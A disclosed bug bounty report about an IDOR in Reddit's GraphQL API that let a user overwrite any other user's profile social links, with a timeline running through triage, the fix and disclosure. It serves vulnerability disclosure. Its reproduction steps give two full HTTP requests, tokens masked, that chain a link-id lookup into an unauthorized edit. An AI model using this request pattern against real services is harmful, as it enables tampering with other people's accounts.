---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/insecure-direct-object-reference-idor
  - env/web
  - vuln/idor
  - vuln/cors-misconfig
  - trigger/cors-origin
substate: "resolved"
weakness: "Insecure Direct Object Reference (IDOR)"
enriched: true
body: true
date: 2022-09-30
submitted: 2022-08-06T05:00:00.232Z
bounty_usd: null
votes: 208
cve: []
program: "[[programs/reddit|Reddit]]"
reporter: "criptex"
source: "https://hackerone.com/reports/1661113"
title: "IDOR allows an attacker to modify the links of any user"
---
# IDOR allows an attacker to modify the links of any user

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 208 | **Program:** Reddit | **Disclosed:** 2022-09-30

- Report: [https://hackerone.com/reports/1661113](https://hackerone.com/reports/1661113)
- CWE: Insecure Direct Object Reference (IDOR)
- Submitted: 2022-08-06T05:00:00.232Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hi team!

I found an IDOR which allows to modify the links of any user.
Users can put their custom links or social media links on their profile, ex:

{F1855366}

##To reproduce this:

- Replicate the following request by replacing it with your own authentication headers:
You must also put in the body of the request, in the parameter "username" the username that you want,  you can try my username: "criptexhackerone1".
This request will return in the response the links of any user profile with the "id" of each link.


```
POST / HTTP/2
Host: gql.reddit.com
Content-Length: 62
Sec-Ch-Ua: ".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"
X-Reddit-Loid:  * * ** * * * * * * * * * * ** * *  * * * * * * * * *  * * * * *  *
Sec-Ch-Ua-Mobile: ?0
Authorization: Bearer * * * * * * *  * * * * * * * * * * * * * * * * * * * * * * * * *  * * * * *  *
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/531.36
X-Reddit-Compression: 1
X-Reddit-Session:  * * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *
Sec-Ch-Ua-Platform: "Windows"
Accept: */*
Origin: https://www.reddit.com
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://www.reddit.com/
Accept-Encoding: gzip, deflate
Accept-Language: es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7,bs;q=0.6,ja;q=0.5

{"id":"11a239b07f86","variables":{"username":"*********"}}
```

- When you get some "id" save it.
- In the next request you have to put in the request body, in the "id" parameter the previously saved id, you can also change the name and the link:

```
POST / HTTP/2
Host: gql.reddit.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20000101 Firefox/101.0
Accept: */*
Accept-Language: es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 173
X-Reddit-Loid: * * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *
X-Reddit-Session: * * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *
X-Reddit-Compression: 1
Origin: https://www.reddit.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
Authorization: Bearer * * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *
Referer: https://www.reddit.com/
Te: trailers

{"id":"c558e604581f","variables":{"input":{"socialLinks":[{"outboundUrl":"https://www.hackerone.com","title":"hacker","type":"CUSTOM","id":"* * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *"}]}}}
```
- Finally re-enter the victim's profile and you will see the modified links. It is important to mention that you may have to reload the page a few times or wait a few seconds.

## Impact

A real attacker can modify the name and content of any user's social links. It is important to add that social links are something main in user profiles, if an attacker exploits this with all reddit users it could be devastating.

Best Regards!!!

## Timeline

- **Report Filed**
- **2022-08-08** @h1_analyst_ava: Hello,

Thank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Have a great day! 

Kind regards,
@sodacan
- **Report Needs More Info**
- **Report New**
- **2022-08-09** @criptex: Social links should appear in your profile as in this photo:  

{F1855366}

 Let me know when you can put them so I can modify them :)
- **Report Needs More Info**
- **Report New**
- **Report Severity Updated**
- **Report Triaged**
- **2022-08-09** @les_oeufs: Started a discussion with the product team and notified them right away about this. This could have some bad image impact for Reddit users. Will keep you posted :)
- **Bounty Awarded**
- **2022-08-10** @criptex: @sodacan  @les_oeufs   Thank you very much for the great bounty and the speed of the update :) 

Best regards!!!
- **2022-08-11** @les_oeufs: This looks to have been fixed, mind double checking? Then we close as resolved :)
- **2022-08-12** @criptex: Hey @les_oeufs  I checked many times, and the implemented fix works correctly, however I tell you that the function of modifying social links does not work, perhaps this is an expected behavior.

Please tell me if you need me to check this again.

Best regards!!!
- **2022-09-27** @criptex: Hi @les_oeufs  I have taken a look at this bug again, and the implemented fix works correctly!
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Report Collaborator Invited**
- **Report Collaborator Joined**
